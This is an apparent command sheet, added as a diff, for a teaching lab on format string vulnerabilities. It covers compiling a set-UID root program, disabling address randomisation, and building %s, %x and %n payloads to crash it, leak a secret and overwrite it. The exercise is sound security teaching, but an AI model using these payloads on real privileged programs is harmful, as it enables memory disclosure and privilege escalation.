@@ -1,0 +1,172 @@
+
+ Command sheet for Format String Lab
+ ===================================
+
+ Vulnerable program with integer input
+ =====================================
+
+ Compile the vulnerable program
+ ------------------------------
+ gcc vul_prog.c -o vul_prog
+
+ Change to set-UID root
+ ----------------------
+ sudo chown root vul_prog
+ sudo chmod 4755 vul_prog
+
+ Note
+ ====
+ Keep randomization on: 
+ sudo sysctl -w kernel.randomize_va_space=2
+
+ Run Vulnerable Program
+ ----------------------
+
+ Normal Input:
+
+ ./vul_prog
+ 123
+ hello
+
+ ./vul_prog
+ 123
+ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+ 
+
+ Task 1: Crash the program
+ -------------------------
+
+ Run the vulnerable program
+ ./vul_prog
+
+ Crash the program
+ Enter some random integer
+ %s%s%s%s%s%s%s%s%s%s%s%s%s%s
+
+
+ Task 2: Print out the secret[1] value
+ -------------------------------------
+
+ Run the vulnerable program, input a integer value, 123 for example
+ ./vul_prog
+ integer value = 123 (decimal)
+ integer value = 0x7b (hex)
+
+ Input the following string, and look for the hex value of the integer 
+ you just entered (123, in this case). 
+ %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+
+ Calculate the distance from the start to the hex value (0x7b)
+ Distance = 
+
+ Since randoimization is on, run the vulnerable program again, calculate the address of secret[1]
+ ./vul_prog
+ address of secret[1] (hex) = 
+ address of secret[1] (decimal) = 
+
+ Construct the input, %s should be at the position of "Distance"
+ integer value = address of secret[1] (decimal)
+ %x,%x,%x,%x,%x,%x,%x,%x,%s
+
+
+ Task 3: Modify the secret[1] value
+ ----------------------------------
+
+ Run the vulnerable program, calculate the address of secret[1]
+ ./vul_prog
+ address of secret[1] (hex) = 
+ address of secret[1] (decimal) = 
+
+ Construct the input, %n should be at the position of "Distance"
+ integer value = address of secret[1] (decimal)
+ %x,%x,%x,%x,%x,%x,%x,%x,%n
+
+
+ Task 4: modify the secret[1] value to a pre-determined value
+ ------------------------------------------------------------
+
+ Set your target value (you can choose a different one, or use the following one)
+ target value = 80(decimal) or 0x50(hex)
+
+ Run the vulnerable program, calculate the address of secret[1]
+ ./vul_prog
+ address of secret[1] (hex) = 
+ address of secret[1] (decimal) =
+
+ Target value should equal to number of %10x times 10 (80 = 8 * 10)
+ %10x%10x%10x%10x%10x%10x%10x%10x%n
+
+
+ Vulnerable program without integer input
+ ========================================
+
+ Compile the vulnerable program
+ ------------------------------
+ gcc vul_prog_no_integer.c -o vul_prog_no_integer
+
+ Change to set-UID root
+ ----------------------
+ sudo chown root vul_prog_no_integer
+ sudo chmod 4755 vul_prog_no_integer
+
+ Disable the memory randomization
+ --------------------------------
+ sudo sysctl -w kernel.randomize_va_space=0
+
+ Command Subsitution Example
+ ---------------------------
+
+ echo 123
+ printf "hello world \n"
+
+ echo $(date)
+ echo $(printf "hello world \n")
+ echo $(printf "\x41\x42\x43\x44")
+ 
+ Construct input using echo and printf bash commands
+ ---------------------------------------------------
+
+ Run the vulnerable program, and observe the address of secret[1]
+ ./vul_prog_no_integer
+ address of secret[1] (hex) =
+
+ If the address contains following special characters, 0x0A (newline), 
+ 0x0C (form feed), 0x0D(return), or 0x20 (space), please uncomment
+ the following two lines in vul_prog_no_integer.c, re-compile and
+ make it a set-uid program. Please make sure the address does not
+ contain any special characters. Then we are ready to go.
+ // int *dummy;
+ // dummy = (int *) malloc(2*sizeof(int));
+
+ Recompile as set-UID root
+ Run the vulnerable program, and observe the address of secret[1]
+ ./vul_prog_no_integer
+ address of secret[1] (hex) =
+ 
+ Construct Input to Observe Distance (use address in printf command argument e.g. 0x0804b01c)
+ echo $(printf "\x1c\xb0\x04\x08").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+ echo $(printf “\x1c\xb0\x04\x08").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x | vul_prog_no_integer
+
+ Observe secret[1] address in output and record distance
+ Distance = 
+
+ Print the secret[1] value
+ -------------------------
+ >> Use conversion specifiers %x and %s
+ >> Use distance to decide where to place %s
+ 
+ <use echo and printf commands to construct input> | ./vul_prog_no_integer
+
+ 
+ Modify the secret[1] value
+ --------------------------
+
+ >> Use conversion specifiers %x and %n
+ >> Use distance to decide where to place %n
+ 
+ <use echo and printf commands to construct input> | ./vul_prog_no_integer
+
+
+ 
+
+
